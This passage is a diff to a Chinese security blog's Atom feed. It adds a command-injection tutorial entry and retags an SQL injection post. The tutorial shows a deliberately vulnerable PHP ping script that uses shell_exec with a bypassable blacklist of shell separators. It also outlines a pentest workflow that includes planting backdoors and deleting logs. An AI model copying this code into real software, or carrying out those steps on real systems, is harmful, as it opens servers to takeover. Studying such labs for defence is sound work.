class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;High级别&#34;&gt;&lt;a href=&#34;#High级别&#34; class=&#34;headerlink&#34; title=&#34;High级别&#34;&gt;&lt;/a&gt;High级别&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 更严格的过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;]);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$substitutions&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;amp;&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;| &amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;(&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;)&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;||&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;array_keys&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$substitutions&lt;/span&gt;), &lt;span class=&#34;hljs-variable&#34;&gt;$substitutions&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;🎓-学习要点&#34;&gt;&lt;a href=&#34;#🎓-学习要点&#34; class=&#34;headerlink&#34; title=&#34;🎓 学习要点&#34;&gt;&lt;/a&gt;🎓 学习要点&lt;/h2&gt;&lt;h3 id=&#34;关键知识点总结&#34;&gt;&lt;a href=&#34;#关键知识点总结&#34; class=&#34;headerlink&#34; title=&#34;关键知识点总结&#34;&gt;&lt;/a&gt;关键知识点总结&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;漏洞成因&lt;/strong&gt;：缺乏输入验证和输出过滤&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;利用方法&lt;/strong&gt;：命令连接符、特殊字符绕过&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;危害程度&lt;/strong&gt;：服务器完全控制、数据泄露&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;防护策略&lt;/strong&gt;：输入验证、权限控制、安全编码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;渗透测试流程&#34;&gt;&lt;a href=&#34;#渗透测试流程&#34; class=&#34;headerlink&#34; title=&#34;渗透测试流程&#34;&gt;&lt;/a&gt;渗透测试流程&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;信息收集&lt;/strong&gt;：确定目标和攻击面&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞发现&lt;/strong&gt;：寻找命令执行点&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞验证&lt;/strong&gt;：确认漏洞存在&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞利用&lt;/strong&gt;：获取系统权限&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限维持&lt;/strong&gt;：上传后门、建立持久连接&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;痕迹清理&lt;/strong&gt;：删除日志、恢复系统状态&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;⚠️-免责声明&#34;&gt;&lt;a href=&#34;#⚠️-免责声明&#34; class=&#34;headerlink&#34; title=&#34;⚠️ 免责声明&#34;&gt;&lt;/a&gt;⚠️ 免责声明&lt;/h2&gt;&lt;p&gt;本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。&lt;/p&gt;
+</content>
+        <category term="渗透测试" />
+        <category term="Web安全" />
+        <category term="命令执行" />
+        <category term="漏洞利用" />
+        <updated>2025-07-26T10:53:13.000Z</updated>
+    </entry>
     <entry>
         <id>https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</id>
         <title>SQL注入攻击详解</title>
@@ -211,9 +437,9 @@
 &lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供学习和研究使用，请勿用于非法用途。任何人使用本文信息进行违法活动，后果自负。&lt;/p&gt;
 &lt;/blockquote&gt;
 </content>
+        <category term="渗透测试" />
         <category term="Web安全" />
         <category term="SQL注入" />
-        <category term="渗透测试" />
         <category term="网络安全" />
         <updated>2025-07-23T23:51:59.000Z</updated>
     </entry>
